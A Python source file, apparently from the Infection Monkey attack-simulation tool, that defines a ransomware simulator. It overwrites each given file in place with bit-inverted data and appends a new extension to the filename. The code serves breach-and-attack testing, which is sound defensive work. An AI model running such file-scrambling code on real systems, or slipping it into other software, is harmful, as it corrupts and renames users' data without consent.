from pathlib import Path
from typing import List

from infection_monkey.utils import bit_manipulators


class RansomwareBitflipEncryptor:
    def __init__(self, new_file_extension, chunk_size=64):
        self._new_file_extension = new_file_extension
        self._chunk_size = chunk_size

    def _add_extension(self, filepath: Path):
        new_filepath = filepath.with_suffix(f"{filepath.suffix}{self._new_file_extension}")
        filepath.rename(new_filepath)

    def encrypt_files(self, file_list: List[Path]):
        for filepath in file_list:
            self._encrypt_single_file_in_place(filepath)
            self._add_extension(filepath)

    def _encrypt_single_file_in_place(self, filepath: Path):
        with open(filepath, "rb+") as f:
            data = f.read(self._chunk_size)
            while data:
                num_bytes_read = len(data)

                encrypted_data = bit_manipulators.flip_bits(data)

                f.seek(-num_bytes_read, 1)
                f.write(encrypted_data)

                data = f.read(self._chunk_size)
